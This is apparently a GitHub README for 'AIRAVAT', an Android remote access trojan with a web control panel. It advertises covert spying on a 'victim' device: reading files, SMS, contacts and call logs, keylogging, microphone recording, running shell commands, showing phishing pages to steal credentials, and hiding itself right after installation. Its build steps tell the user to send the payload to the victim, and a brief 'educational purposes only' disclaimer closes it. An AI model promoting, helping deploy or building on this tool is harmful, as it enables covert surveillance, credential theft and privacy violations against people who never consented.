
<p align="center">
<img src='WEB PANEL/img/logo.png' style="height:100px;width:100px;" >
</p>
<h1 align=center>AIRAVAT</h1>

#### A multifunctional Android RAT with GUI based Web Panel without port forwarding.

<div align="center">

</div>

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio through Mic
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Pre Binded with [Instagram Webview Phishing 
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed
 - It will be automatically hidden as soon as it is installed 🤣


## Requirements

KSWEB APK 


## How to Build 
 1. Download AIRAVAT.zip
 2. Extract zip open ANDROID APP sent Payload to Victim Device 
 3. Open KSWEB app for Web Panel 
 4. Open your Storage and Find htdocs Folder 
 5. Open WEB PANEL and Move all files to htdocs
 
 Done 👍

 


 ❤️
FOLLOW FOR MORE 

INSTAGRAM :nikhil4494kumar

## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>


The use of the AIRAVAT is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).








